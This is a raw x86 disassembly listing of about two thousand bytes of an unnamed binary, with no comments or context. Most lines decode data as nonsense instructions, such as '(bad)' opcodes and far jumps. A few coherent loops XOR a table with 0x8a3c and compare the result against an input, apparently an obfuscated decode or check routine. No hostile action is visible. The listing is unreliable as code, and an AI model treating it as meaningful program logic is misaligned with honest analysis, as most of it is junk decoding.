  403261:	push   ss
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032c2
  403269:	nop
  40326a:	cmc    
  40326b:	push   ss
  40326c:	push   es
  40326d:	push   edx
  40326e:	pop    esi
  40326f:	sub    bl,bl
  403271:	xchg   esp,eax
  403272:	outs   dx,DWORD PTR ds:[esi]
  403273:	sar    ebp,0xf8
  403276:	cwde   
  403277:	retf   
  403278:	xor    al,0x15
  40327a:	adc    al,0xc0
  40327c:	or     eax,0x801bf4c6
  403281:	add    DWORD PTR [ebx-0x46],edi
  403284:	fidiv  WORD PTR ds:[edx+esi*2-0x54900e80]
  40328c:	mov    ch,0xf4
  40328e:	or     bh,BYTE PTR [edx+0xa]
  403291:	ins    BYTE PTR es:[edi],dx
  403292:	int    0xd
  403294:	in     eax,dx
  403295:	pop    esi
  403296:	lock ja 0x403250
  403299:	dec    ecx
  40329a:	sbb    DWORD PTR [edx-0x620cd814],0x694ab05e
  4032a4:	add    al,0xa9
  4032a6:	cs cmp ebp,esi
  4032a9:	add    BYTE PTR [eax-0x700416d9],ah
  4032af:	pusha  
  4032b0:	dec    edx
  4032b1:	dec    ebx
  4032b2:	ins    BYTE PTR es:[edi],dx
  4032b3:	jbe    0x403254
  4032b5:	int    0xd9
  4032b7:	nop
  4032b8:	mov    ds:0xa7d37582,al
  4032bd:	or     al,0x39
  4032bf:	mov    eax,0x930dc896
  4032c4:	and    al,0x6d
  4032c6:	add    ebx,DWORD PTR [eax+0x69]
  4032c9:	test   edx,ecx
  4032cb:	or     edx,DWORD PTR [edi-0x5b78ba90]
  4032d1:	mov    dl,0x6
  4032d3:	mov    ebp,0x1cb47a72
  4032d8:	punpckhwd mm1,QWORD PTR [eax+0x5a8d3de5]
  4032df:	test   al,0x90
  4032e1:	or     al,0x7c
  4032e3:	and    eax,ebx
  4032e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032e6:	xor    DWORD PTR [ebx+eax*8-0x6cb26f79],edx
  4032ed:	inc    ecx
  4032ee:	push   esi
  4032ef:	stc    
  4032f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032f1:	es dec ebp
  4032f3:	sub    esi,DWORD PTR [ebp+0x2da94479]
  4032f9:	pop    ecx
  4032fa:	fisubr DWORD PTR [esi*1+0x3fd8e08]
  403301:	out    0x45,al
  403303:	mov    DWORD PTR [edx-0xa2bed7c],ecx
  403309:	or     bl,BYTE PTR [ecx-0x72]
  40330c:	xor    dl,BYTE PTR [esi-0x2624c133]
  403312:	cmc    
  403313:	push   0x59d826d0
  403318:	sub    eax,0x8d1c2463
  40331d:	sahf   
  40331e:	mov    bl,0xde
  403320:	ins    BYTE PTR es:[edi],dx
  403321:	sub    DWORD PTR [ebx+eax*2+0x1a],ecx
  403325:	std    
  403326:	popa   
  403327:	cs out dx,al
  403329:	imul   edx,edx,0xac67dacc
  40332f:	jge    0x4032ca
  403331:	neg    DWORD PTR [ecx]
  403333:	scas   eax,DWORD PTR es:[edi]
  403334:	aam    0xc8
  403336:	dec    esp
  403337:	sbb    eax,0xfd121aa3
  40333c:	sbb    al,0xff
  40333e:	repz add esp,DWORD PTR [ecx-0x7a2ff28e]
  403345:	and    edi,DWORD PTR [edx-0x608b0b85]
  40334b:	mov    ebx,0x2994bc4e
  403350:	in     al,dx
  403351:	retf   0xd494
  403354:	les    ebx,FWORD PTR [esi]
  403356:	out    0x8a,al
  403358:	sub    DWORD PTR [edx+0x79],ebx
  40335b:	rcl    DWORD PTR [ecx],0xff
  40335e:	cmc    
  40335f:	and    DWORD PTR [ebp+0x3dfeb3b2],edi
  403365:	sbb    edi,DWORD PTR [eax*2-0x59af6086]
  40336c:	add    edi,DWORD PTR [edi-0x1a]
  40336f:	xor    al,0xf1
  403371:	cmc    
  403372:	xchg   edx,eax
  403373:	jp     0x4033aa
  403375:	je     0x4032fe
  403377:	push   es
  403378:	out    0xa0,eax
  40337a:	jmp    0x1ed0:0x87416d28
  403381:	imul   eax,DWORD PTR [ecx+edi*2+0x9e1c408],0x5f
  403389:	xchg   BYTE PTR [edx+0x79],bl
  40338c:	jb     0x403388
  40338e:	pop    edi
  40338f:	jmp    0xe2c6:0x99ab6045
  403396:	sub    BYTE PTR [ebp-0x1d425bc4],dh
  40339c:	pusha  
  40339d:	inc    eax
  40339e:	push   ebx
  40339f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033a0:	dec    eax
  4033a1:	xor    BYTE PTR [esi+0xaf343c6],0x31
  4033a8:	xlat   BYTE PTR ds:[ebx]
  4033a9:	fmul   QWORD PTR [ebx-0x70b5933e]
  4033af:	push   ebp
  4033b0:	or     BYTE PTR [edx-0x7],0x82
  4033b4:	jmp    0x9329f343
  4033b9:	leave  
  4033ba:	xor    al,BYTE PTR [edx]
  4033bc:	mov    eax,ds:0xa6d84b97
  4033c1:	mov    dh,0xfe
  4033c3:	lea    ebp,[eax+0x3f]
  4033c6:	mov    ds:0x8d1ea27,al
  4033cb:	or     DWORD PTR [ebp+0x67],ecx
  4033ce:	(bad)  
  4033cf:	sub    al,0x6c
  4033d1:	adc    BYTE PTR [ebx-0x1c],dh
  4033d4:	mov    ebp,0x57c75f6b
  4033d9:	push   ecx
  4033da:	mov    dl,BYTE PTR [edx]
  4033dc:	pop    ebp
  4033dd:	mov    BYTE PTR [edi],bl
  4033df:	sbb    al,0x42
  4033e1:	xchg   ebp,eax
  4033e2:	inc    ecx
  4033e3:	jo     0x4033b9
  4033e5:	lds    esi,FWORD PTR [edi+ebp*4+0x2184593c]
  4033ec:	jo     0x4033a4
  4033ee:	add    DWORD PTR [ecx+0x35],ecx
  4033f1:	sbb    BYTE PTR [esi+ebx*2],ch
  4033f4:	and    al,0x3f
  4033f6:	adc    eax,0x298169d1
  4033fb:	shl    DWORD PTR [esi+ebp*8-0x11],cl
  4033ff:	ret    
  403400:	adc    BYTE PTR [eax+0x5c],ch
  403403:	test   DWORD PTR fs:[esp+eax*2],esp
  403407:	dec    eax
  403408:	popf   
  403409:	adc    bl,BYTE PTR [edi+0x492798e9]
  40340f:	fisub  DWORD PTR [eax]
  403411:	call   0x43e6:0xa60a6
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x430459
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	(bad)  
  403453:	out    0x6e,eax
  403455:	icebp  
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x40342a
  40345f:	push   esi
  403460:	push   esp
  403461:	fs call 0x15edef32
  403467:	pop    esp
  403468:	jecxz  0x403466
  40346a:	push   eax
  40346b:	dec    esi
  40346c:	stos   DWORD PTR es:[edi],eax
  40346d:	xchg   esp,eax
  40346e:	fwait
  40346f:	jb     0x403445
  403471:	jne    0x40344b
  403473:	or     ebp,edi
  403475:	mov    al,ds:0x5cd82342
  40347a:	xchg   ebp,eax
  40347b:	adc    esp,DWORD PTR [eax]
  40347d:	ja     0x4034bf
  40347f:	outs   dx,DWORD PTR ds:[esi]
  403480:	push   esp
  403481:	sbb    ebp,0xd074814c
  403487:	dec    edi
  403488:	pop    ebp
  403489:	mov    bh,0x8a
  40348b:	adc    edx,DWORD PTR [ebx+0x42]
  40348e:	sbb    al,0xc7
  403490:	test   DWORD PTR [ebx],0x160158fe
  403496:	in     al,0x2f
  403498:	in     eax,dx
  403499:	popf   
  40349a:	mov    ah,0x9f
  40349c:	fidiv  DWORD PTR [edx*1-0x74c22f07]
  4034a3:	test   al,0x61
  4034a5:	(bad)  
  4034a6:	icebp  
  4034a7:	jge    0x4034db
  4034a9:	jle    0x4034c0
  4034ab:	fdiv   DWORD PTR [edi+0x7599da13]
  4034b1:	sbb    al,BYTE PTR [ecx+0x73ea8a5b]
  4034b7:	lahf   
  4034b8:	test   ch,0xb3
  4034bb:	test   eax,0x98d09005
  4034c0:	int3   
  4034c1:	push   esp
  4034c2:	pop    edi
  4034c3:	inc    ecx
  4034c4:	retf   
  4034c5:	shr    dh,cl
  4034c7:	jns    0x4034f0
  4034c9:	cmp    BYTE PTR [eax],al
  4034cb:	xchg   edi,eax
  4034cc:	push   eax
  4034cd:	call   FWORD PTR [ecx-0x3362bc90]
  4034d3:	scas   eax,DWORD PTR es:[edi]
  4034d4:	inc    eax
  4034d5:	popf   
  4034d6:	aas    
  4034d7:	pop    edi
  4034d8:	push   ebx
  4034d9:	mov    esi,DWORD PTR [edx+eiz*1+0x4c]
  4034dd:	out    0x5c,eax
  4034df:	cmp    eax,0x46e2a6a3
  4034e4:	adc    al,0x72
  4034e6:	push   edx
  4034e7:	int    0x10
  4034e9:	push   edi
  4034ea:	arpl   WORD PTR [ecx],dx
  4034ec:	xadd   ah,cl
  4034ef:	iret   
  4034f0:	test   DWORD PTR [ecx],esp
  4034f2:	mov    ebp,0x15b6a2b
  4034f7:	fdivr  st(2),st
  4034fa:	(bad)  
  4034fb:	es mov ah,0x37
  4034fe:	(bad)  
  4034ff:	fs pop ebx
  403501:	mov    ss,WORD PTR ds:0x3aa7fc68
  403507:	push   ds
  403508:	lods   eax,DWORD PTR ds:[esi]
  403509:	mov    ah,al
  40350b:	sub    ah,BYTE PTR [ebx-0x2]
  40350e:	mov    WORD PTR [eax-0x45d76fec],cs
  403514:	out    dx,al
  403515:	mov    ecx,0x389f49b6
  40351a:	add    edi,DWORD PTR [edx+0x6a]
  40351d:	push   ebp
  40351e:	sbb    cl,BYTE PTR [ecx-0x484a5b4e]
  403524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403525:	nop
  403526:	ds jl  0x403524
  403529:	jp     0x40359e
  40352b:	ret    0x6ddc
  40352e:	sub    al,0x4f
  403530:	retf   
  403531:	jbe    0x4034b9
  403533:	pop    ecx
  403534:	rep lods eax,DWORD PTR ds:[esi]
  403536:	push   ss
  403537:	push   es
  403538:	and    BYTE PTR [eax-0x7e],cl
  40353b:	sub    ebx,DWORD PTR gs:[edx+0x3856123d]
  403542:	pop    ss
  403543:	push   esi
  403544:	pop    ebp
  403545:	push   esi
  403546:	sar    edx,cl
  403548:	push   edi
  403549:	out    dx,eax
  40354a:	leave  
  40354b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40354c:	not    BYTE PTR [ebp+0x7cbdaecb]
  403552:	leave  
  403553:	mov    BYTE PTR [ebp+edx*1+0x17a40749],al
  40355a:	in     eax,dx
  40355b:	add    al,0xbe
  40355d:	mov    dl,0x20
  40355f:	xchg   ecx,eax
  403560:	lea    ebp,[ebp+0xc122c4e]
  403566:	xor    ebx,DWORD PTR [edi+0x2]
  403569:	pushf  
  40356a:	push   esi
  40356b:	lods   eax,DWORD PTR ds:[esi]
  40356c:	dec    eax
  40356d:	jb     0x403547
  40356f:	mov    esp,DWORD PTR [eax-0x26]
  403572:	xor    eax,DWORD PTR [ecx-0x54]
  403575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403576:	in     eax,dx
  403577:	fidivr WORD PTR [edi+edx*4]
  40357a:	fdivr  st,st(1)
  40357c:	jnp    0x403523
  40357e:	push   edx
  40357f:	je     0x40351b
  403581:	fcom   DWORD PTR [edi-0x6b]
  403584:	into   
  403585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403586:	hlt    
  403587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403588:	inc    esi
  403589:	mov    esp,0x3a54eb01
  40358e:	fwait
  40358f:	cmp    BYTE PTR [edi],bh
  403591:	gs push edi
  403593:	sahf   
  403594:	aam    0xfb
  403596:	scas   eax,DWORD PTR es:[edi]
  403597:	xchg   DWORD PTR [eax+0x0],edx
  40359a:	ret    
  40359b:	dec    ebp
  40359c:	pop    ebx
  40359d:	out    0xdc,eax
  40359f:	jno    0x4035e3
  4035a1:	not    DWORD PTR [ebx+eiz*2+0x24ea5066]
  4035a8:	enter  0xbc0f,0x67
  4035ac:	or     ebx,esi
  4035ae:	das    
  4035af:	push   edx
  4035b0:	mov    ?,WORD PTR [ebp+eax*8+0x5627d0ee]
  4035b7:	mov    dh,al
  4035b9:	dec    esi
  4035ba:	and    al,0x8a
  4035bc:	out    dx,al
  4035bd:	dec    ebx
  4035be:	mov    DWORD PTR [eax-0x44],edx
  4035c1:	jl     0x4035d4
  4035c3:	mov    al,ds:0x46824ee2
  4035c8:	add    BYTE PTR [ebx+esi*4],al
  4035cb:	ss test ebp,esi
  4035ce:	rcr    BYTE PTR [esi+ebp*2-0x1b],cl
  4035d2:	xchg   esp,eax
  4035d3:	pop    edx
  4035d4:	rol    DWORD PTR [ecx+0x1f],1
  4035d7:	cdq    
  4035d8:	test   al,0xfe
  4035da:	or     esi,ebp
  4035dc:	sar    ch,cl
  4035de:	jge    0x403570
  4035e0:	ret    0xb49d
  4035e3:	fsub   QWORD PTR [esi-0x4c]
  4035e6:	jns    0x403626
  4035e8:	adc    dl,dh
  4035ea:	mov    ah,0x22
  4035ec:	inc    edi
  4035ed:	xchg   ecx,eax
  4035ee:	xor    eax,0x4905811f
  4035f3:	pop    ss
  4035f4:	xlat   BYTE PTR ds:[ebx]
  4035f5:	push   ds
  4035f6:	add    BYTE PTR [edx],0x6d
  4035f9:	cmp    al,0x35
  4035fb:	pop    esi
  4035fc:	aas    
  4035fd:	ds mov bl,0x45
  403600:	lods   al,BYTE PTR ds:[esi]
  403601:	test   esi,esp
  403603:	jbe    0x403635
  403605:	adc    ebp,DWORD PTR [eax]
  403607:	push   eax
  403608:	push   0x3a2ce3a7
  40360d:	adc    DWORD PTR [ebx],esi
  40360f:	rol    DWORD PTR [ebx],1
  403611:	(bad)  
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x333dd7c8
  40366f:	enter  0x816c,0xb2
  403673:	adc    eax,0x7fae7e7e
  403678:	jle    0x4036f8
  40367a:	dec    eax
  40367b:	je     0x403690
  40367d:	mov    DWORD PTR [edx],ebp
  40367f:	cmp    al,0xb4
  403682:	dec    ebp
  403683:	xor    al,0xe
  403685:	sub    eax,edi
  403687:	push   edi
  403688:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40368a:	mov    dh,0x2e
  40368c:	(bad)  
  40368d:	(bad)
  403690:	or     cl,cl
  403692:	retf   
  403693:	in     al,0x6e
  403695:	lahf   
  403696:	jle    0x40369b
  403698:	push   0xede65352
  40369d:	jg     0x40363f
  40369f:	aas    
  4036a0:	dec    esp
  4036a1:	ret    0x3599
  4036a4:	push   ds
  4036a5:	ins    DWORD PTR es:[edi],dx
  4036a6:	cmp    dh,ah
  4036a8:	retf   
  4036a9:	jmp    0x403724
  4036ab:	pop    ds
  4036ac:	inc    esp
  4036ad:	nop
  4036ae:	or     ch,BYTE PTR [esi+0x36]
  4036b1:	ins    DWORD PTR es:[edi],dx
  4036b2:	data16 jp 0x40371b
  4036b5:	retf   0x8024
  4036b8:	into   
  4036b9:	stos   BYTE PTR es:[edi],al
  4036ba:	sub    ah,dl
  4036bc:	sub    eax,0xd9c01dbc
  4036c1:	cmp    DWORD PTR [ebx],edi
  4036c3:	imul   edx,DWORD PTR [ecx],0x68c8f6fe
  4036c9:	or     BYTE PTR [edi],al
  4036cb:	leave  
  4036cc:	xor    ecx,esi
  4036ce:	cmc    
  4036cf:	sar    BYTE PTR [eax-0x26],cl
  4036d2:	into   
  4036d3:	xchg   esi,eax
  4036d4:	and    BYTE PTR [ecx-0xc0ce4af],bh
  4036da:	mov    esp,DWORD PTR [eax]
  4036dc:	addr16 xchg esp,eax
  4036de:	or     esi,edx
  4036e0:	cmp    BYTE PTR [ebx],0xf0
  4036e3:	mov    ebp,0xaea40579
  4036e8:	inc    esi
  4036e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036eb:	push   eax
  4036ec:	repz mov ebx,0x7595eef1
  4036f2:	xor    cl,bl
  4036f4:	ins    DWORD PTR es:[edi],dx
  4036f5:	inc    ebx
  4036f6:	in     eax,dx
  4036f7:	imul   esp,DWORD PTR [eax-0x39],0x670cd726
  4036fe:	inc    ebx
  4036ff:	retf   
  403700:	inc    esi
  403701:	jle    0x4036ae
  403703:	repz idiv esi
  403706:	xchg   BYTE PTR [ecx-0x3d],ch
  403709:	bound  esi,QWORD PTR [eax*2-0x4137cbd0]
  403710:	dec    esi
  403711:	jle    0x40374b
  403713:	fcomp  st(3)
  403715:	mov    bh,0xc5
  403717:	mov    edi,0x5eb13971
  40371c:	add    al,ch
  40371e:	push   ds
  40371f:	hlt    
  403720:	popa   
  403721:	mov    ch,0x56
  403723:	imul   esi,DWORD PTR [ecx-0x76],0x38
  403727:	into   
  403728:	push   edx
  403729:	cmp    eax,0x27c1f620
  40372e:	lock shl ecx,cl
  403731:	fwait
  403732:	jmp    0xe505:0x955673ce
  403739:	cli    
  40373a:	or     ebx,edi
  40373c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40373d:	and    eax,0xedebfd2f
  403742:	and    ah,BYTE PTR [ebx-0x169cd65c]
  403748:	sbb    eax,0x2b8a41c6
  40374d:	add    BYTE PTR [ecx-0x48],bh
  403750:	xchg   esp,eax
  403751:	dec    ebp
  403752:	mov    esi,0xdd5e2bca
  403757:	push   0xffffffa9
  403759:	pop    eax
  40375a:	outs   dx,BYTE PTR ds:[esi]
  40375b:	xor    eax,0xf5df85af
  403760:	mov    ch,0x4f
  403762:	aaa    
  403763:	mov    ah,0xc6
  403765:	or     eax,0x6cc43734
  40376a:	mov    al,ds:0xa9b1afdc
  40376f:	jne    0x4037d9
  403771:	call   0x58171384
  403776:	sub    BYTE PTR [eax+0x72],0xe1
  40377a:	sti    
  40377b:	mov    eax,0x94917339
  403780:	pop    ecx
  403781:	xchg   ebx,eax
  403782:	xchg   BYTE PTR [ebp-0x6a],al
  403785:	mov    edi,0x2cc2a19f
  40378a:	jo     0x4037d7
  40378c:	cmc    
  40378d:	and    al,0x25
  40378f:	jne    0x40377e
  403791:	ss inc edi
  403793:	pop    ebp
  403794:	sti    
  403795:	cmp    al,0x72
  403797:	mov    ecx,0x5b379945
  40379c:	in     eax,0x5f
  40379e:	mov    DWORD PTR [edi+0x5c],esi
  4037a1:	push   ecx
  4037a2:	test   edx,0xd6b93a14
  4037a8:	jo     0x40376a
  4037aa:	xchg   edi,eax
  4037ab:	leave  
  4037ac:	loop   0x403740
  4037ae:	pop    esp
  4037af:	std    
  4037b0:	mov    eax,0xf03cfc61
  4037b5:	xchg   esi,eax
  4037b6:	repz sbb edx,DWORD PTR [ebp+0x67]
  4037ba:	jae    0x40381d
  4037bc:	ja     0x403811
  4037be:	aam    0x74
  4037c0:	jl     0x40383d
  4037c2:	push   es
  4037c3:	mov    eax,ds:0x4f4bfeab
  4037c8:	cld    
  4037c9:	or     al,0x61
  4037cb:	push   cs
  4037cc:	mov    ecx,ecx
  4037ce:	call   0x5a1f0bb9
  4037d3:	dec    esi
  4037d4:	sti    
  4037d5:	shl    BYTE PTR [eax-0x3c],0xfe
  4037d9:	stos   BYTE PTR es:[edi],al
  4037da:	push   ebp
  4037db:	jl     0x403811
  4037dd:	jnp    0x403819
  4037df:	jo     0x40379e
  4037e1:	or     edx,edx
  4037e3:	mov    ebp,gs
  4037e5:	adc    BYTE PTR [eax+0xa],ah
  4037e8:	xchg   ebx,eax
  4037e9:	or     BYTE PTR [esp+esi*8-0x5a275857],ch
  4037f0:	daa    
  4037f1:	pusha  
  4037f2:	push   esp
  4037f3:	ret    
  4037f4:	dec    esp
  4037f5:	or     ebp,esi
  4037f7:	or     al,cl
  4037f9:	jae    0x403875
  4037fb:	fsub   QWORD PTR [edi]
  4037fd:	mov    ebp,0x7f087347
  403802:	int3   
  403803:	outs   dx,BYTE PTR ds:[esi]
  403804:	inc    BYTE PTR [edi+0x2f41d5bf]
  40380a:	fwait
  40380b:	and    al,0xb3
  40380d:	jne    0x4037c8
  40380f:	dec    ebx
  403810:	jl     0x403855
  403812:	ror    BYTE PTR [edx+0x42a0c4c2],cl
  403818:	lds    edx,FWORD PTR [edi-0x37]
  40381b:	jae    0x4037e0
  40381d:	xchg   esi,eax
  40381e:	fist   WORD PTR [ecx+0x48757c4d]
  403824:	jmp    0x8b47:0xa394d50b
  40382b:	push   ebp
  40382c:	adc    BYTE PTR [ebx],dh
  40382e:	rol    DWORD PTR [ebx],0xc6
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xadb77d23
  403845:	shl    edx,0x13
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x40385f
  40384f:	std    
  403850:	sbb    ebp,DWORD PTR ss:[eax+0x1c]
  403854:	lods   al,BYTE PTR ds:[esi]
  403855:	stos   BYTE PTR es:[edi],al
  403856:	mov    eax,ds:0x642873e5
  40385b:	stc    
  40385c:	or     eax,0x7032e3c4
  403861:	fwait
  403862:	aas    
  403863:	pop    ebp
  403864:	repz adc esi,eax
  403867:	dec    edx
  403868:	push   eax
  403869:	dec    eax
  40386a:	or     al,0x17
  40386c:	dec    ebx
  40386d:	dec    ebp
  40386e:	daa    
  40386f:	mov    BYTE PTR ds:0xbb8c8fca,bl
  403875:	js     0x4038e1
  403877:	dec    ebx
  403878:	adc    al,0x20
  40387a:	scas   al,BYTE PTR es:[edi]
  40387b:	push   esp
  40387c:	int    0x1a
  40387e:	clc    
  40387f:	icebp  
  403880:	rcr    DWORD PTR [esi+0x36],1
  403883:	jmp    0xe11bd8b4
  403888:	pop    ss
  403889:	lahf   
  40388a:	xlat   BYTE PTR ds:[ebx]
  40388b:	call   DWORD PTR [ecx-0x690398be]
  403891:	aas    
  403892:	xor    DWORD PTR [edx],0x85b58bac
  403898:	jecxz  0x40381d
  40389a:	retf   
  40389b:	push   ecx
  40389c:	sahf   
  40389d:	arpl   WORD PTR [ecx*8-0x1ec416e3],bx
  4038a4:	xor    dh,dl
  4038a6:	je     0x40387e
  4038a8:	adc    eax,0xc3d4fde5
  4038ad:	ret    
  4038ae:	shl    BYTE PTR [edx],0x7f
  4038b1:	push   cs
  4038b2:	stc    
  4038b3:	ja     0x40391a
  4038b5:	cli    
  4038b6:	sbb    edx,eax
  4038b8:	scas   eax,DWORD PTR es:[edi]
  4038b9:	push   ds
  4038ba:	jno    0x40384a
  4038bc:	xchg   edi,eax
  4038bd:	sbb    eax,0x72f72247
  4038c2:	aad    0xc7
  4038c4:	unpcklps xmm2,XMMWORD PTR [ebp+0x25ba5c2]
  4038cb:	push   esi
  4038cc:	inc    edx
  4038cd:	sbb    BYTE PTR [edx+0x30],dl
  4038d0:	rcr    BYTE PTR [esi+eax*8+0x3],0x20
  4038d5:	adc    al,dl
  4038d7:	lods   eax,DWORD PTR ds:[esi]
  4038d8:	nop
  4038d9:	out    0x98,eax
  4038db:	arpl   WORD PTR [ecx-0x5f5adb13],dx
  4038e1:	ds es push edx
  4038e4:	adc    cl,BYTE PTR [esi-0x11b2859]
  4038ea:	loop   0x40394a
  4038ec:	pop    edi
  4038ed:	int3   
  4038ee:	push   cs
  4038ef:	fst    DWORD PTR [esi+ecx*1+0x51383809]
  4038f6:	mov    ecx,0xb3db6f53
  4038fb:	shl    DWORD PTR [ecx-0x4e97515d],1
  403901:	in     eax,0x32
  403903:	aam    0x8a
  403905:	ret    0x593
  403908:	pop    ecx
  403909:	cmc    
  40390a:	retf   
  40390b:	sub    al,0xc5
  40390d:	mov    dh,dl
  40390f:	cmp    al,0x5d
  403911:	fiadd  DWORD PTR [ebx+0x4353b737]
  403917:	shl    cl,1
  403919:	std    
  40391a:	into   
  40391b:	out    0x48,al
  40391d:	test   esp,edx
  40391f:	sub    ebx,DWORD PTR ds:0x982ca2b7
  403925:	dec    ebp
  403926:	dec    edi
  403927:	mov    esi,0xaad7b53e
  40392c:	xor    esp,edx
  40392e:	sti    
  40392f:	retf   
  403930:	sub    al,0xc1
  403932:	loop   0x403914
  403934:	cmp    al,0xd3
  403936:	out    dx,eax
  403937:	data16 daa 
  403939:	out    dx,al
  40393a:	stos   BYTE PTR es:[edi],al
  40393b:	sbb    esi,ebp
  40393d:	ja     0x4038d0
  40393f:	inc    esp
  403940:	jns    0x403929
  403942:	dec    ecx
  403943:	or     ebp,esp
  403945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403946:	sub    DWORD PTR [edx],ebp
  403948:	(bad)  
  403949:	aam    0xbe
  40394b:	lock dec esp
  40394d:	adc    cl,BYTE PTR [edx+0x4b1232a]
  403953:	mov    ch,0xa9
  403955:	out    dx,eax
  403956:	int3   
  403957:	mov    edi,0xcfeda8c4
  40395c:	add    eax,0xe3d89217
  403961:	mov    ecx,0x56a98e72
  403966:	mov    cl,0x8a
  403968:	push   edx
  403969:	xor    eax,0x6757811
  40396e:	in     al,0x7d
  403970:	out    0xec,eax
  403972:	add    al,BYTE PTR [edi+0x6a]
  403975:	jo     0x40391f
  403977:	add    al,0xa9
  403979:	retf   
  40397a:	xor    al,0x47
  40397c:	(bad)  
  40397d:	mov    WORD PTR [ecx+0xa03db37],gs
  403983:	scas   eax,DWORD PTR es:[edi]
  403984:	jge    0x40398e
  403986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403987:	(bad)  
  403988:	in     eax,dx
  403989:	stos   BYTE PTR es:[edi],al
  40398a:	repz jg 0x4039ee
  40398d:	scas   eax,DWORD PTR es:[edi]
  40398e:	fldcw  WORD PTR [ebp+0x337c144d]
  403994:	mov    bh,0x74
  403996:	les    ebp,FWORD PTR [ebx]
  403998:	sbb    DWORD PTR [bp+0x29f0],esi
  40399d:	xchg   edi,eax
  40399e:	mov    bl,0xd
  4039a0:	mov    edi,0x9056d60a
  4039a5:	mov    eax,ds:0x9b1eae14
  4039aa:	(bad)  
  4039ab:	cmp    bl,BYTE PTR [esi+ecx*1]
  4039ae:	das    
  4039af:	inc    ebx
  4039b0:	pop    edx
  4039b1:	shr    BYTE PTR [ebx-0x64],0x48
  4039b5:	dec    ecx
  4039b6:	mov    ds:0xf261cf97,eax
  4039bb:	push   edi
  4039bc:	out    0x5c,al
  4039be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039bf:	sub    ebp,DWORD PTR [edi-0x70]
  4039c2:	ret    
  4039c3:	pop    esi
  4039c4:	clc    
  4039c5:	adc    BYTE PTR [ebx-0x59a0ce5e],ah
  4039cb:	dec    edx
  4039cc:	rol    BYTE PTR [esi-0x67ec3b7],cl
  4039d2:	mov    DWORD PTR [ebx+0x2c],ebp
  4039d5:	ins    DWORD PTR es:[edi],dx
  4039d6:	adc    eax,0x305b144d
  4039db:	pop    ebx
  4039dc:	adc    al,0x61
  4039de:	xor    DWORD PTR [ecx+0x74],esi
  4039e1:	not    dl
  4039e3:	out    dx,eax
  4039e4:	jmp    0xc753d01f
  4039e9:	sar    edx,cl
  4039eb:	mov    WORD PTR [esi+ebp*1-0x629e0bd4],?
  4039f2:	pop    eax
  4039f3:	shl    DWORD PTR [eax+0x3e0051fc],cl
  4039f9:	jmp    0x289:0x51bbfc3d
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
